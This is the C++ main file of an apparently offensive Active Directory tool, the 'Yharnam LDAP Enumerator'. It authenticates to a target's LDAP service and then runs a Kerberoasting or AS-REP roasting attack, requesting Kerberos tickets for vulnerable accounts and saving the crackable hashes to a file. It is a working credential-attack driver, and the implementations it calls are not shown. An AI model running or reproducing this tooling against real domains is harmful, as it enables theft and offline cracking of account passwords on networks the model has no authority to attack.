#include <iostream>
#include <vector>
#include <string>
#include <ldap.h>
#include "connections/LDAPConnection.h"
#include "cli/ArgumentParser.h"
#include "attacks/Attacks.h"
#include "connections/KerberosInteraction.h"
#include "utils/Utils.h"
#include "utils/Colors.h"


int main(int argc, char* argv[]) {
    //int debug_level = -1;
    //ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, &debug_level);

    ArgumentParser parser;
    
    if (!parser.parse(argc, argv))
        return 0;

    
        
    std::string target_ip = parser.getIP();
    User _u = parser.getUser();
    std::string username = _u.username;
    std::string password = _u.password;
        
    const std::string baseDN = parser.makeBaseDN();

    std::cout << "--- Yharnam LDAP Enumerator ---" << std::endl;
    LDAPConnection connection;

    if (!connection.connect(target_ip))
        return 1;

    std::cout << Colors::COLOR_BLUE << "[+] Connection established \t\t\t\t" << parser.getIP() << Colors::COLOR_RESET << std::endl;
    if (connection.bind(username, password)) {
        std::cout << Colors::COLOR_GREEN << "[*] Authenticated successfully \t\t\t\t" << username << ":" << password << Colors::COLOR_RESET << std::endl;
        
        if (parser.getAttackMethod() == AttackMethod::NONE) {

        } else {
            AttackMethod _att = parser.getAttackMethod();
            switch (_att) {
                case AttackMethod::KERBEROAST: {
                    Attacks::Kerberoast krbroast(connection, username, password);

                    std::vector<std::string> spns = krbroast.listUser(baseDN);
                    std::vector<std::pair<std::string, std::string>> to_save;
                    for (std::string target : spns) {
                        to_save.emplace_back(krbroast.requestTicket(target, username, !parser.getFilePath().empty()));
                    }
                    Utils::saveToFile(to_save, parser.getFilePath());
                    break;
                }
                case AttackMethod::ASREPROAST: {
                    Attacks::ASREPRoast asreproast(connection);
                    std::vector<std::string> vuln_users = asreproast.listUser(baseDN);
                    for (const std::string& vuln : vuln_users) {
                        asreproast.requestTicket(vuln);
                    }
                    break;
                }
                default:
                    break;
            }
                
            std::cout << Colors::COLOR_BLUE << "\nFinishing attack" << Colors::COLOR_RESET;
        }
    } else {
        std::cout << Colors::COLOR_RED << "[-] Authentication failed \t\t\t\t" << username << ":" << password << Colors::COLOR_RESET << std::endl;
    }
    std::cout << "\nEyes..." << std::endl;
    return 0;
}